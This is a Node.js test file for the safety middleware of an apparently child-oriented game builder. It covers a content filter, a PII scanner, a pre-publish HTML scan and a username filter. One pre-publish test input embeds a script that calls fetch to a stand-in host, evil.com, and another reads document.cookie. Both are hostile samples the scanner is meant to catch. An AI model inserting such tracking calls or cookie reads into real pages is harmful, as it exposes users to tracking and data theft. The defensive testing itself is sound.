/**
 * Automated Safety Tests
 *
 * Tests content filter, PII scanner, pre-publish scan, and username filter.
 * Run: node server/tests/safety.test.js
 */

import { filterContent } from '../middleware/contentFilter.js';
import { scanPII } from '../middleware/piiScanner.js';
import { prePublishScan } from '../middleware/prePublishScan.js';
import { filterUsername } from '../middleware/usernameFilter.js';

let passed = 0;
let failed = 0;

function assert(condition, label) {
  if (condition) {
    passed++;
  } else {
    failed++;
    console.error(`  FAIL: ${label}`);
  }
}

function section(name) {
  console.log(`\n--- ${name} ---`);
}

// ========== CONTENT FILTER ==========
section('Content Filter');

assert(filterContent('make a platformer game').blocked === false, 'Normal prompt allowed');
assert(filterContent('make a sword fighting game').blocked === false, 'Sword fighting allowed');
assert(filterContent('make a zombie shooter').blocked === false, 'Zombie shooter allowed');
assert(filterContent('make a porn game').blocked === true, 'Blocks "porn"');
assert(filterContent('make a p.o.r.n game').blocked === true, 'Blocks "p.o.r.n" bypass');
assert(filterContent('make a p0rn game').blocked === true, 'Blocks leet "p0rn"');
assert(filterContent('school shooting game').blocked === true, 'Blocks school shooting');
assert(filterContent('sch00l sh00ting').blocked === true, 'Blocks leet school shooting');
assert(filterContent('suicide simulator').blocked === true, 'Blocks suicide');
assert(filterContent('drug dealer game').blocked === true, 'Blocks drug dealer');
assert(filterContent('make a n a z i game').blocked === true, 'Blocks spaced nazi');
assert(filterContent('hentai art game').blocked === true, 'Blocks hentai');
assert(filterContent('where do you live').blocked === true, 'Blocks grooming phrase');
assert(filterContent('casino slot machine').blocked === true, 'Blocks gambling');

// ========== PII SCANNER ==========
section('PII Scanner');

const pii1 = scanPII('my email is kid@example.com and I want a game');
assert(pii1.piiFound.includes('email'), 'Detects email');
assert(!pii1.cleaned.includes('kid@example.com'), 'Removes email');

const pii2 = scanPII('my name is Jake Smith and I live in Mesa Arizona');
assert(pii2.piiFound.includes('name'), 'Detects "my name is"');
assert(pii2.piiFound.includes('location'), 'Detects "I live in"');

const pii3 = scanPII('call me at 555-123-4567');
assert(pii3.piiFound.includes('phone'), 'Detects phone number');
assert(!pii3.cleaned.includes('555-123-4567'), 'Removes phone number');

const pii4 = scanPII('my ssn is 123-45-6789');
assert(pii4.piiFound.includes('ssn'), 'Detects SSN');

const pii5 = scanPII('make a cool racing game');
assert(pii5.piiFound.length === 0, 'No PII in normal prompt');
assert(pii5.cleaned === 'make a cool racing game', 'Normal text unchanged');

// ========== PRE-PUBLISH SCAN ==========
section('Pre-Publish Scan');

const scan1 = prePublishScan('<html><body><h1>My Cool Game</h1><script>var x=1;</script></body></html>');
assert(scan1.safe === true, 'Clean game passes');

const scan2 = prePublishScan('<html><body><h1>Drug Dealer Simulator</h1></body></html>');
assert(scan2.safe === false, 'Inappropriate title blocked');
assert(scan2.warnings.includes('inappropriate_content'), 'Reports inappropriate_content');

const scan3 = prePublishScan('<html><body><script>fetch("https://evil.com/track")</script></body></html>');
assert(scan3.warnings.includes('external_request'), 'Detects fetch()');

const scan4 = prePublishScan('<html><body><script>localStorage.setItem("x","y")</script></body></html>');
assert(scan4.warnings.includes('browser_storage'), 'Detects localStorage');

const scan5 = prePublishScan('<html><body><script>document.cookie</script></body></html>');
assert(scan5.warnings.includes('cookie_access'), 'Detects cookie access');

const scan6 = prePublishScan('<html><body><p>Contact me at kid@school.edu</p></body></html>');
assert(scan6.warnings.some(w => w.startsWith('pii_detected')), 'Detects PII in published game');

// ========== USERNAME FILTER ==========
section('Username Filter');

assert(filterUsername('CoolGamer99').blocked === false, 'Normal username allowed');
assert(filterUsername('DragonSlayer').blocked === false, 'Creative username allowed');
assert(filterUsername('xX_NinjaX').blocked === false, 'Gaming-style username allowed');
assert(filterUsername('john_smith').blocked === true, 'Blocks "john smith" pattern');
assert(filterUsername('JohnSmith').blocked === true, 'Blocks "JohnSmith" pattern');
assert(filterUsername('sarah2013').blocked === true, 'Blocks name+birth year');
assert(filterUsername('emily2015').blocked === true, 'Blocks name+birth year 2');
assert(filterUsername('5thgrade').blocked === true, 'Blocks grade reference');
assert(filterUsername('player123').blocked === false, 'Generic "player123" allowed');
assert(filterUsername('jake_mcallister').blocked === true, 'Blocks first+last name pattern');

// ========== RESULTS ==========
console.log(`\n========================================`);
console.log(`  Results: ${passed} passed, ${failed} failed`);
console.log(`========================================\n`);

process.exit(failed > 0 ? 1 : 0);
